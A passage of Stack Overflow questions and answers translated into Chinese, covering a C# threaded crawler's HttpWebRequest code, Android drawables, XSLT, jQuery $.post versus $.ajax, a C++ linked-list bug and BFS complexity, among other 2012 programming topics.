        System.Text.ASCIIEncoding _enc = new System.Text.ASCIIEncoding();
        _wReq = (HttpWebRequest)HttpWebRequest.Create(URL);
        _wReq.UserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";
        _wReq.Accept = "*/*";
        _wReq.Method = "GET";
        _wReq.CookieContainer = cookieJarf;
        _wReq.ServicePoint.ConnectionLimit = 100;
        _wReq.KeepAlive = false;
        _wReq.Timeout = 5000;
        _wReq.ReadWriteTimeout = 5000;
        _wReq.Pipelined = true;

        if (proxy != "")
        {
            WebProxy myproxy = new WebProxy(proxy);
            _wReq.Proxy = myproxy;
        }

        _wResp = (HttpWebResponse)_wReq.GetResponse();
        Encoding responseEncoding = Encoding.GetEncoding(_wResp.CharacterSet);
        using (StreamReader sr = new StreamReader(_wResp.GetResponseStream(), responseEncoding))
        {
            _html = sr.ReadToEnd();
        }

        cookieJarf = _wReq.CookieContainer;
        _wResp.Close();
    }
    catch (WebException wexc1)
    {
        MessageBox.Show(wexc1.Message); // Time out exception when running more than 10 threads

        if (wexc1.Status == WebExceptionStatus.ProtocolError)
        {
            return "";
        }
    }
    finally
    {
         if (_wResp != null)
             _wResp.Close();
    }
    return _html;
} 
```

我不知道我应该尝试什么：/ 当然它必须可以同时运行例如 50 个 httpwebrequests？

编辑：应该说，这些线程连接中的一些连接到同一台服务器，而另一些连接到不同的服务器。我基本上将这种方法用于我的线程爬虫。

编辑1：

单击按钮后，我将像这样添加我的线程：

```
foreach (string item in urlQueue)
{
    _smartThreadPool.QueueWorkItem(
    new Amib.Threading.Func<string, int, int, string, int>(checkURL),
    item, iia, 5000, kryptonTextBox1.Text);

    iia++;
} 
```

# android - android中透明imageView的边框

> ID：12820036
> 
> 赞同：4
> 
> 时间：2012-10-10T13:04:59.617
> 
> 标签：android, imageview, border

我想要一个只有边框并且内部透明的图像视图。获取边框的常见技巧似乎是在我们想要边框的图像视图下方使用另一个尺寸稍大的图像视图，但这在这里不起作用，因为我想要一个透明的图像视图。我怎样才能创建它？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-10T13:13:17.093

在 drawable 文件夹中创建一个新的 backgroundcolor.xml 文件

```
<shape xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle" >

    <solid android:color="@color/transparent" />

    <stroke
        android:width="0.5dip"
        android:color="@color/black" />

    <padding
        android:bottom="2dp"
        android:left="2dp"
        android:right="2dp"
        android:top="2dp" />

</shape> 
```

并将其作为背景添加到您的 imageview

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:20:05.167

您可以将 xml 文件用作 imageview 的可绘制对象。例如，将此 xml 文件作为border.xml 放在您的drawable-mdpi 文件夹中：

```
<?xml version="1.0" encoding="UTF-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android">
<solid android:color="#FFFFFF" />
<stroke android:width="1dp" android:color="#000000" />
<padding android:left="1dp" android:top="1dp" android:right="1dp"
    android:bottom="1dp" />
</shape> 
```

然后在您的主布局中，将其用作图像视图的可绘制背景。图像视图将为空，仅显示边框。

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="100dp"
        android:layout_height="100dp"
        android:layout_gravity="center_horizontal"
        android:layout_marginTop="100dp"
        android:src="@drawable/border" />

</LinearLayout> 
```

# c# - WebConfigurationManager 还是 HttpContext.Application？

> ID：12820040
> 
> 赞同：0
> 
> 时间：2012-10-10T13:05:02.827
> 
> 标签：c#, asp.net-mvc, configuration, httpcontext

我是 C#、.net 等的初学者，我正在使用 MVC Web 应用程序。

`Application_Start()`我在 Global.asax.cs中看到了一些示例，人们使用这些示例`Application.Add("prop", "value")`来存储来自 Web.config 的值。

然后我们可以在控制器中通过`HttpContext.Application["prop"]`.

使用有区别吗

```
HttpContext.Application["prop"] 
```

并使用

```
WebConfigurationManager["prop"] 
```

?

我认为在此页面中：http: [//msdn.microsoft.com/en-us/library/system.web.configuration.webconfigurationmanager.aspx](http://msdn.microsoft.com/en-us/library/system.web.configuration.webconfigurationmanager.aspx)建议`WebConfigurationManager`用于 Web 应用程序，但他们不谈论`HttpContext.Application`.

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:13:02.410

**两者有不同的目的**。

`HttpContext.Application`代表[HttpApplicationState](http://msdn.microsoft.com/en-us/library/94xkskdf%28v=vs.85%29.aspx)，您可以将其视为一组应用程序级别的全局变量。它存储在内存中而不是持久化到磁盘，因此如果重新启动工作进程，它就会丢失。

另一方面，`WebConfigurationManager`用于访问 Web.Config 文件。它存储在磁盘上并在应用程序池被回收时持久化。

对于您所描述的特定情况，我想有人可能认为将属性从 Web.Config 加载到内存中并从内存中访问它们会带来性能优势，尽管我不相信会有很大的性能优势达到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:09:36.727

当您使用`HttpApplicationState`来存储和检索值时，不会写入 web.config 文件 - 实际上，它可能已经为该请求加载了。您正在做的是将其存储在某种形式的缓存中，该缓存与应用程序的生命周期一样长。

使用配置管理器，它会在调用时写入（该实例的）底层配置文件`Save`。

基本上，这些是不同的东西，尽管它们对您（用户）来说似乎以相同的方式起作用。

# android - 已签名的 apk 在我的设备上不起作用

> ID：12820044
> 
> 赞同：0
> 
> 时间：2012-10-10T13:05:25.710
> 
> 标签：android, keystore, sign

我已经使用清单中的导出签名 apk 向导对我的 .apk 进行了签名，我正在尝试将它部署在我的设备上，但即使在签名过程中没有发生任何问题，它也无法工作，当我将它安装在我的设备上时它开始了安装它并停止向我显示（未安装应用程序）。

```
<?xml version="1.0" encoding="utf-8"?><manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.nazzelha.elfagr"
android:installLocation="auto"
android:versionCode="1"
android:versionName="1.0" >
<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="16" />
<supports-screens
    android:anyDensity="true"
    android:largeScreens="true"
    android:normalScreens="true"
    android:resizeable="true"
    android:smallScreens="true" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<!-- Mobclix Required Permissions " -->
<uses-permission android:name="android.permission.READ_PHONE_STATE" >
</uses-permission>
<!-- Mobclix Optional Permissions -->
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" >
</uses-permission>
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" >
</uses-permission>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" >
</uses-permission>
<application
    android:allowTaskReparenting="true"
    android:debuggable="false"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:permission="android.permission.ACCESS_COARSE_LOCATION"
    android:theme="@android:style/Theme.Light.NoTitleBar" >
    <activity
        android:name=".FeedsActivity"
        android:label="@string/app_name"
        android:screenOrientation="portrait" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <activity
        android:name=".Activity1"
        android:screenOrientation="portrait" />
    <activity
        android:name=".Activity2"
        android:screenOrientation="portrait" />
    <activity
        android:name=".Activity3"
        android:screenOrientation="portrait" />
    <activity
        android:name=".InfoActivity"
        android:screenOrientation="portrait" />
    <!-- Twitter -->
    <activity
        android:name="com.ecs.android.sample.twitter.PrepareRequestTokenActivity"
        android:launchMode="singleTask"
        android:screenOrientation="portrait" >
        <intent-filter>
            <action android:name="android.intent.action.VIEW" />

            <category android:name="android.intent.category.DEFAULT" />
            <category android:name="android.intent.category.BROWSABLE" />

            <data
                android:host="callback"
                android:scheme="x-oauthflow-twitter" />
        </intent-filter>
    </activity>
    <!-- Mobclix and AdMob Required Parameter -->
    <meta-data
        android:name="com.mobclix.APPLICATION_ID"
        android:value="ID" />
    <meta-data
        android:name="ADMOB_PUBLISHER_ID"
        android:value="ID" />
    <activity
        android:name="com.google.ads.AdActivity"
        android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode"
        android:screenOrientation="portrait" />
    <activity
        android:name="com.mobclix.android.sdk.MobclixBrowserActivity"
        android:screenOrientation="portrait" />
</application> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:12:32.473

## 您需要先卸载手机上的应用程序，然后才能从 .apk 安装

现在我知道您遇到的错误，问题有点奇怪。我在[这里](http://code.google.com/p/android/issues/detail?id=6719)发现了类似的问题。根据最后一条评论，他的问题是 androidmanifest.xml 上的一行错误。也许你应该检查你的清单，看看是否一切正常。

# xslt - Identity XSLT 排除某些字段

> ID：12820047
> 
> 赞同：2
> 
> 时间：2012-10-10T13:05:34.083
> 
> 标签：xslt, identity

我想使用标识模板来转换 XML-> XML，同时排除某些节点。

这些节点将位于文档的不同级别 - 下面的 XML 示例：

```
<root>
.    <item1>
.       <contents>
.           <fieldA/>
.           ...
.           <fieldZ/>
.       </contents>
.    </item1>
.    <item2>
.       <field1/>
.       ...
.       <field9/>
.    </item2>
</root> 
```

例如，我只想包含“root/item1/contents”中的“fieldC”和“root/item2”中的“field2”。

我的 XSLT 在下面。它不起作用，我认为是因为我不包含要包含的字段的父元素？但我不确定我该怎么做......

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" > 
<xsl:output method="xml" indent="yes" />
.    <xsl:strip-space elements="*"/>
.    <xsl:template match="@* | node()">
.        <xsl:copy>
.            <xsl:apply-templates select="@* | node()" />
.        </xsl:copy>
.    </xsl:template>
.    
.    <xsl:template match="fieldC|field2">
.        <xsl:element name="{name()}">
.           <xsl:value-of select="text()" />
.        </xsl:element>
.    </xsl:template>
</xsl:stylesheet> 
```

如果有人可以提供帮助，将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:09:24.643

**使用**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="node()|@*">
     <xsl:copy>
       <xsl:apply-templates select="node()|@*"/>
     </xsl:copy>
 </xsl:template>

 <xsl:template match=
 "item1/contents/*[not(self::fieldC)] | item2/*[not(self::field2)]"/>
</xsl:stylesheet> 
```

**当此转换应用于以下 XML 文档**（源自提供的草图）时：

```
<root>
    .    <item1>
    .       <contents>
    .           <fieldA/>
    .           <fieldB/>
    .           <fieldC/>
    .           ...
    .           <fieldZ/>
    .       </contents>
    .    </item1>
    .    <item2>
    .       <field1/>
    .       <field2/>
    .       ...
    .       <field9/>
    .    </item2>
</root> 
```

**产生了想要的正确结果（删除了指定的元素）：**

```
<root>
    .    <item1>
    .       <contents>
    .           
    .           
    .           <fieldC/>
    .           ...
    .           
    .       </contents>
    .    </item1>
    .    <item2>
    .       
    .       <field2/>
    .       ...
    .       
    .    </item2>
</root> 
```

# math - 如何计算数字滑块拼图的汉明距离

> ID：12820048
> 
> 赞同：1
> 
> 时间：2012-10-10T13:05:35.747
> 
> 标签：math, search, artificial-intelligence, heuristics, hamming-distance

如何计算以下谜题的[汉明距离：](http://en.wikipedia.org/wiki/Hamming_distance)

![在此处输入图像描述](../Images/47d7038f9de72a052e9e5a880f6c5835.png)

据我了解，我需要比较以下两个序列：

```
13-11-15-00-10-08-09-12-01-06-03-02-04-07-14-05
01-02-03-04-05-06-07-08-09-10-11-12-13-14-15-00
=
16 
```

还是没那么容易？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T16:01:08.053

想法正确，执行错误。

空白牌不应被视为编号为 00 的牌；空白瓦片根本不是瓦片，不应包含在计算中。

（你明白为什么吗？汉明距离旨在成为一种可接受的启发式方法，而可接受的启发式方法是从不悲观的。它决不能估计比实际成本更差的成本。但是在这里，如果只有一块瓷砖超出地方，包含空白的汉明距离将给出 2 的估计值，而实际成本为 1。）

# perl - XML::LibXML 是否可以解析古怪的标签？

> ID：12820049
> 
> 赞同：2
> 
> 时间：2012-10-10T13:05:40.503
> 
> 标签：perl, xml-libxml

是否可以`XML::LibXML`解析以下示例中显示的节点？我意识到我可能通过将 a 指定`'*'`为节点名称的一部分来创建无效的 XML，如果有人能解释为什么它无效，我将不胜感激：

```
use strict;
use warnings;
use XML::LibXML;

my $doc = XML::LibXML->createDocument;

my $quirky = XML::LibXML::Element->new( 'YAK*' );
$quirky->appendText( 'Important Data' );

$doc->setDocumentElement( $quirky );

print $doc->toString;  # <?xml version="1.0"?>
                       # <YAK*>Important Data</YAK*>

my $data = XML::LibXML
           ->new
             ->parse_string( $doc->toString ); 
```

输出：

```
<?xml version="1.0"?>
<YAK*>Important Data</YAK*>
:2: parser error : error parsing attribute name
<YAK*>Important Data</YAK*>
    ^
:2: parser error : attributes construct error
<YAK*>Important Data</YAK*>
    ^
:2: parser error : Couldn't find end of Start Tag YAK line 2
<YAK*>Important Data</YAK*>
    ^
:2: parser error : Extra content at the end of the document
<YAK*>Important Data</YAK*>
    ^ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T15:50:36.283

如果您打开一个`recover`选项，它将尝试工作-

```
my $parser = XML::LibXML->new;
$parser->recover_silently(1);
my $doc2 = $parser->parse_string( $doc->toString );
print $doc2->toString; 
```

但是，如您所见，尽管它可以解析无效文档，但它不能/不会往返一个——

```
<?xml version="1.0"?>
<YAK/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:12:29.133

`*`不是元素名称中的有效字符，因为规范不允许这样的字符出现在元素名称中。请参阅[NameChar](http://www.w3.org/TR/2004/REC-xml11-20040204/#NT-NameChar)。

# java - 在 IntelliJ IDEA 中使用 Spring-test-mvc 进行测试的更简单方法？备择方案？

> ID：12820053
> 
> 赞同：0
> 
> 时间：2012-10-10T13:05:45.893
> 
> 标签：java, spring, unit-testing, spring-mvc, spring-test-mvc

我最近一直在尝试 spring-test-mvc，因为在应用程序上下文中使用 handlerAdapter 和 handlerMapping 对象不再支持会话属性，因为当您像在 Spring 3.0 中那样以这种方式传递对象时。

有什么方法可以简化 IntelliJ IDEA 对这些测试的编码？必须导入这么多静态方法相当耗时，老实说，我更喜欢旧的测试方法（但在 3.1 中我不能再这样做了）。有什么方法可以告诉 IntelliJ IDEA：“如果我键入`get()`，自动静态导入该方法”？

除了控制器逻辑之外，是否有任何其他替代 spring-test-mvc 更容易编写代码但也可以测试请求映射的替代方法？我还需要支持会话属性。

除了在 spring-test-mvc 中编写测试的奇怪语法之外，将会话属性传入控制器似乎真的很奇怪。他们似乎鼓励创建一个对象构造函数，您可以在其中以这种方式传递会话对象......但我不想在生产期间不使用这个构造函数时在我的控制器上创建它。这一定是一种测试反模式，但我没有看到任何其他方法可以将会话对象作为请求的一部分传递，他们的示例鼓励制作这个对象构造函数。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T19:36:31.630

在 IntelliJ 的首选项中，您可以在选项卡下方`Project Settings > Code Style > Java`和下方`Import`输入您始终希望使用`*`. 如果您输入`spring-test-mvc`经常导入的类的包名称，那么 IntelliJ 应该在您开始输入时自动为您建议（并添加导入）方法。

![在此处输入图像描述](../Images/eade2c66dbcb4bc0bb44886baf256d49.png)

# c# - 在最终用户计算机上运行支持 Kinect 的应用程序的先决条件

> ID：12820055
> 
> 赞同：2
> 
> 时间：2012-10-10T13:05:48.413
> 
> 标签：c#, wpf, runtime, kinect

我开发了一个使用 Kinect 的应用程序。该应用程序是在运行 64 位 Windows 7 Professional（使用 Bootcamp）的 iMac 上使用 Visual Studio 2012 开发的。我已经使用`Publish Wizard`来创建它的设置。现在我需要让它在任何运行 32/64 位 Windows 7 的计算机上运行。我已经在最终用户计算机上安装了 Kinect Runtime v1.5 设置。此外，.NET Framework 4 Client 已安装在最终用户计算机上。

问题是，使用从`setup.exe`创建的文件`Publish Wizard`，应用程序被安装在最终用户机器上。但是，当我尝试通过双击放置在 中的应用程序文件来启动它时`Start Menu`，没有任何反应。此外，应用程序进程未在后台运行。我检查了它。

此外，我在两台运行 64 位 Windows 7 的不同机器上进行了尝试。观察到相同的行为。当我尝试在我的 iMac 上使用该应用程序时（通过使用安装文件安装它），它运行完美。

究竟是什么问题，我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-12T08:43:30.880

对于遇到安装程序创建问题的任何人：我认为您应该安装 InstallShield LE 并按照这些说明创建安装程序。他们非常直截了当：

[http://www.c-sharpcorner.com/uploadfile/cb88b2/simple-steps-to-create-setup-file-using-install-shield-le-fr/](http://www.c-sharpcorner.com/uploadfile/cb88b2/simple-steps-to-create-setup-file-using-install-shield-le-fr/)

重要提示：您需要 Visual Studio，而不是 Visual Studio EXPRESS。

# gwt - 如何通过 Maven 使 apache commons 和 gwt 工作？

> ID：12820057
> 
> 赞同：0
> 
> 时间：2012-10-10T13:05:52.673
> 
> 标签：gwt, maven

我在一个项目中使用 GWT 和 apache commons 中的许多类。将ant改为maven后，出现了与apache commons和gwt-dev的冲突。如果没有 gwt-dev lib 依赖项（但手动设置为类路径以使用 GWT 开发模式），则会出现以下错误：

> [错误] /project/branches/maven/server/project-server/target/generated-sources/gwt/com/project/client/Service_TypeSerializer.java:[20,3] 找不到符号
> 
> [错误] 符号：类 GwtScriptOnly
> 
> [错误] 位置：com.project.client.Service_TypeSerializer 类

/project/branches/maven/server/project-server/target/generated-sources/ 中没有 /gwt/com/project/client 文件夹。

使用 gwt-dev 依赖项项目根本不会构建。

有没有关于如何解决 apache commons 和 gwt 冲突的解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T15:53:27.450

这是一个[*已知问题*](http://code.google.com/p/google-web-toolkit/issues/detail?id=4484)，但实际上我认为您应该将客户端和服务器代码放在单独的 Maven 模块中。
它更干净：关注点分离，还将客户端依赖项与服务器依赖项分开——这将解决你的问题——并且不会不必要地将你的客户端类打包到`WEB-INF/classes`.

查看[https://github.com/tbroyer/gwt-maven-archetypes](https://github.com/tbroyer/gwt-maven-archetypes)以了解一种方法（另请参阅具有一些背景的[公告）。](http://tbroyer.posterous.com/announcing-gwt-maven-archetypes-project)

# c++ - 链表头指针在传递给函数 C++ 时发生变化

> ID：12820069
> 
> 赞同：3
> 
> 时间：2012-10-10T13:06:28.573
> 
> 标签：c++, pointers, linked-list

我的第二年编程课有一个问题，涉及创建一组双向链接列表来代表医院以及医院中的医生和患者。医院有一个医生名单，每个医生都有一个病人名单。我的问题是，当我调用“hireDoctor”函数将医生添加到医院列表时，不知何故，头指针正在改变。这是我的代码：

```
 /* adds a Doctor to the Hospital's list of Doctors */
    void Hospital::hireDoctor(Doctor *doc)
    {
        DoctorNode node;
        node.value = *doc;
        DoctorNode* curr;

        if (drListHead == NULL) {    //if doctor list is empty,
            drListHead = &node;    //insert the node at the beginning
            node.next = NULL;
            node.prev = NULL;
        } else {
            curr = drListHead;
            //traverse list until equal or greater (alphabetical) value is found:
            while (curr->value.getLast().compare(node.value.getLast()) < 0 &&
            curr->value.getFirst().compare(node.value.getFirst()) < 0) {
                curr = curr->next;
            }
            if (curr->prev == NULL) {     //if inserting at the beginning of the list
               drListHead = &node;
               node.prev = NULL;
               node.next = curr;
            } else if (curr->next == NULL) { //if the end of the list has been reached
                curr->next = &node;
                node.prev = curr;
                node.next = NULL;
            } else {              //insert the new DoctorNode in the middle:
                curr->next->prev = &node;
                node.next = curr->next;
                curr->next = &node;
                node.prev = curr;
            }
     } 
```

列表中的每个节点都定义为一个结构：

```
 struct DoctorNode {
      Doctor value;
      DoctorNode *next;
      DoctorNode *prev;
    } 
```

因此，一旦使用了hireDoctor 函数，如果我“雇用”了一位名叫John Smith 的医生，我希望drListHead 指向John Smith，这似乎就是发生的事情。然而，在第二次通过该函数，雇用 Jane Doe 时，似乎 drListHead在进入该函数时*已经*指向 Jane Doe。我无法弄清楚它在哪里发生了变化。任何想法将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:22:13.520

问题在这里：

```
 if (drListHead == NULL) {    //if doctor list is empty,
            drListHead = &node;    //insert the node at the beginning  <------
            node.next = NULL;
            node.prev = NULL;
        } 
```

您的节点在堆栈上初始化，退出后`hireDoctor`它将指向堆栈的地址。下次您`hireDoctor`再次调用 node 时，将指向同一地址，即 Jane Doe（这只是巧合）。你需要这个：

```
 if (drListHead == NULL) {    //if doctor list is empty,
                drListHead = new DoctorNode();    //heap allocation 
                drListHead->next = NULL;
                drListHead->prev = NULL;
            } 
```

但请记住，您必须实现将未使用的释放到内存中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:20:31.280

问题就在这里： `DoctorNode node;` 这样您的节点在函数中具有可见性；当函数结束时，这个变量被销毁。因为被破坏的变量是可重用的 ram，但在此 ram 未被其他东西使用之前不会更改，因此您认为仍然具有正确的值。下一个医生创建要求一些 ram，并且“随便”与以前的医生相同的 ram 是免费的并用于新医生。这意味着您已经重写了头部指向的 ram，也丢失了老医生的所有数据（好吧，数据仍然在这里，只是您没有更多指向它的指针，所以它在某个地方丢失了RAM；这在技术上称为“垃圾”）。

寻找“可变可见性”以获得更好的解释

解决办法是改成指针

`DoctorNode node*;`

使用“new”来保留 ram，直到您通过调用“delete”明确释放该 ram。如果您在没有释放使用“删除”分配的所有指针的情况下销毁了医生，那么您也在创建垃圾。见[http://www.codeproject.com/Articles/6555/To-new-is-C-To-malloc-is-C-To-mix-them-is-sin](http://www.codeproject.com/Articles/6555/To-new-is-C-To-malloc-is-C-To-mix-them-is-sin)

一个常见的问题是用垃圾填充 RAM，这会导致程序甚至操作系统崩溃。

# facebook - 是否可以通过 Facebook API 更改用户家乡？

> ID：12820072
> 
> 赞同：1
> 
> 时间：2012-10-10T13:06:39.527
> 
> 标签：facebook, facebook-graph-api, facebook-php-sdk

我找不到任何有关在 facebook api 中更改用户设置的信息...

这是 facebook 上的一个应用程序，我希望用户能够改变家乡。

听起来很简单！

# javascript - $.post 和 $.ajax 之间的区别？

> ID：12820074
> 
> 赞同：74
> 
> 时间：2012-10-10T13:06:45.643
> 
> 标签：javascript, jquery, ajax, asp.net-mvc, serialization

好奇是否有人知道数据参数的区别。

我有一种`$.post`方法，它将 a`$('#myform').serialize()`作为我的数据参数并且可以工作。

如果我使用该方法尝试相同的`$.ajax()`方法，则它不起作用，因为我的数据参数看起来不正确。

有谁知道区别以及我可以使用什么来代替上面的`.serialize`？

* * *

## 回答 #1

> 赞同：89
> 
> 时间：2012-10-10T13:07:51.697

这个[jquery 论坛线程](http://forum.jquery.com/topic/what-should-i-use-post-vs-ajax)总结了它：

> `$.post`是一种用于 POST 请求的简写方式`$.ajax`，因此使用两者之间没有太大区别——它们都可以使用相同的底层代码。`$.get`工作原理类似。
> 
> ——阿约斯马尼

简而言之，这是：

```
$.post( "/ajax", {"data" : json }) 
```

等价于以下内容：

```
$.ajax({ 
  type: "POST", 
  url: "/ajax", 
  data: {"data": json} 
}); 
```

* * *

## 回答 #2

> 赞同：51
> 
> 时间：2012-10-10T13:08:55.820

这里的问题不是实际上`$.ajax()`不起作用，而是因为您没有在 Ajax 请求中设置类型参数，它默认为 GET 请求。数据是通过 get 的查询字符串发送的，如果您的后端期望它们作为 post 参数，它将不会读取它们。

`$.post`只是与 的电话`$.ajax()`，只是与`type`集合。阅读[文档](http://api.jquery.com/jQuery.ajax/)，您将看到`$.ajax()`我上面提到的默认为 GET。

如果您转到jQuery 文档中的[jQuery.post页面，它会向您显示带有类型集的 $.ajax 请求。](http://api.jquery.com/jQuery.post/)再次阅读文档。

* * *

## 回答 #3

> 赞同：27
> 
> 时间：2012-10-10T13:47:03.890

在重新阅读了一些在线文档后，我决定坚持使用 $.post 而不是 $.ajax。

$.ajax 方法的数据参数与 $.post 方法的作用不同，不确定到底是什么，但有区别。

我想使用 $.ajax 的唯一原因是因为我希望能够处理事件并且没有意识到我可以使用 $.post 来做到这一点。

这是我最终得到的

```
function GetSearchItems() {
    var url = '@Url.Action("GetShopSearchResults", "Shop", New With {.area = "Shop"})';
    var data = $("#ShopPane").serialize();
    // Clear container
    $('#shopResultsContainer').html('');
    // Retrieve data from action method
    var jqxhr = $.post(url, data);
    // Handle results
    jqxhr.success(function(result) {
        //alert("ajax success");
        $('#shopResultsContainer').html(result.ViewMarkup);
    });
    jqxhr.error(function() {
        //alert("ajax error");
    });
    jqxhr.complete(function() {
        //alert("ajax complete");
    });

    // Show results container
    $("#shopResultsContainer").slideDown('slow');
} 
```

**jQuery 3.x**

> jqXHR.success()、jqXHR.error() 和 jqXHR.complete() 回调方法在 jQuery 3.0 中被移除。您可以改用 jqXHR.done()、jqXHR.fail() 和 jqXHR.always()。

```
var jqxhr = $.post(url, data);
// Handle results
jqxhr.done(function(result) {
    //alert("ajax success");
});
jqxhr.fail(function() {
    //alert("ajax error");
});
jqxhr.always(function() {
    //alert("ajax complete");
}); 
```

[https://api.jquery.com/jquery.post/](https://api.jquery.com/jquery.post/)

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2012-10-10T13:11:07.983

您是否将其指定为数据参数。`$.post`只是`$.ajax`预期以下内容的简写。

```
$.ajax({
    type : 'POST',
    url : url,
    data : data,
    success : success,
    dataType : dataType
}); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-04-12T20:51:38.783

作为补充，在接受的答案中，提到“ *$.ajax 方法的数据参数与 $.post 方法所做的不同，不确定到底是什么，但有区别*”

请尝试使用：

```
 { 
        ... 
        data: JSON.stringify(yourJsonData), 
        ... 
    } 
```

否则 json 对象将作为 url 编码的字符串插入到有效负载中。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-04-22T23:28:07.587

使用 $.ajax 我们可以发出 GET 或 POST 请求。使用 $.post 我们只能发出 post 请求。使用 $.get 我们只能发出获取请求。

```
$.ajax()    // Performs an async AJAX request
$.get()     // Loads data from a server using an AJAX HTTP GET request
$.post()    // Loads data from a server using an AJAX HTTP POST request 
```

* * *

## 回答 #7

> 赞同：-6
> 
> 时间：2014-09-24T11:23:14.837

在`$.ajax`您可以同步，但在功能中是不可能的`$.post`。同步意味着您可以获得返回的结果。

```
var tmp;
$.ajax({
    'async': false,
    'type': "POST",
    'global': false,
    'dataType': 'html',
    'url': "Your Url",
    'data': {'type': 'data'},
    'success': function (data) {
        tmp = data;
    }
});
alert(tmp); 
```

# django - django-respite 创建对象

> ID：12820076
> 
> 赞同：0
> 
> 时间：2012-10-10T13:06:47.657
> 
> 标签：django, rest

我正在尝试将[django-respite](https://django-respite.readthedocs.org)与 Django 一起使用，但我在创建新对象时遇到了问题。

在正常的 Django 视图中，我会

```
def post_new(request):
    if request.method == 'POST':    
        form = PostForm(request.POST)
        if form.is_valid():
            form.save()
            return HttpResponseRedirect("/posts/")
        else:
            form = PostForm()

    ctx = {'form': form}
    return render_to_response('app_post/new_post.html', ctx, RequestContext(request)) 
```

我试图将它移植到喘息中（文档只讨论 GET 方法），我得出了这个结论：

```
# views.py
class PostViews(Views):
    supported_formats = ['html', 'json']
    template_path     = 'post/'

    def index(self, request):    
        ...

    def show(self, request, id):
        ...

    def create(self, request):
        form = PostForm(request.POST)
        if form.is_valid():
            form.save()
            return HttpResponseRedirect("posts/")

        return self._render(
            request = request,
            template = 'new_post',
            context = {
                'form': form
            },
       )

    def new(self, request):
        form = PostForm()

        return self._render(
            request = request,
            template = 'new_post',
            context = {
                'form': form
            },
    )

# urls.py
urlpatterns = resource(
    prefix = 'posts/',
    views = PostViews,
    routes = [
        routes.route(
             regex = r'^(?:$|index%s$)' % (templates.format),
             view = 'index',
             method = 'GET',
             name = 'posts'
        ),
        routes.route(
             regex = r'^(?P<id>[0-9]+)%s$' % (templates.format),
             view = 'show',
             method = 'GET',
             name = 'post'
        ),
        # New
        routes.route(
             regex = r'^(?:$|new%s$)' % (templates.format),
             view = 'new',
             method = 'GET',
             name = 'post_new'
        ),
        # Create
        routes.route(
             regex = r'^(?:$|create%s$)' % (templates.format),
             view = 'create',
             method = 'POST',
             name = 'post_create'
        )]) 
```

但是当我试图去

```
http://localhost:8000/posts/new.html 
```

我明白了

```
'PostViews' object has no attribute 'new' 
```

有人可以向我解释如何暂时管理 POST 和表单吗？

# algorithm - 在 BFS 中 O(V+E) 如何等于 O(b^d)

> ID：12820077
> 
> 赞同：5
> 
> 时间：2012-10-10T13:06:48.803
> 
> 标签：algorithm, artificial-intelligence, time-complexity, breadth-first-search

在我的算法分析课程中，老师告诉我们呼吸优先搜索的时间复杂度是 O(V+E)，但现在在人工智能课程中老师说 BFS 的复杂度是 O(b ^d )。当我问他问题时，他给了我一个合乎逻辑的理由，即“在理论计算机科学中，O(V+E) 是合适的，因为图是输入到搜索算法的显式数据结构。在 AI 中，图通常表示由初始状态、动作和过渡模型隐含地表示，并且通常是无限的。因此，复杂度用 O(b ^d )" 表示。现在我有两个问题

1.  O(V+E) 和 O(b ^d ) 如何相等，第一个看起来像线性复杂度，第二个看起来是指数的。
2.  当我们谈论大 O 表示法时，它意味着无论输入可能是上限，它都应该保持不变，因为它是一个上限。Big O 是否只处理一些有限的数据输入？

[维基百科来源](http://en.wikipedia.org/wiki/Breadth-first_search)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-10T13:10:08.117

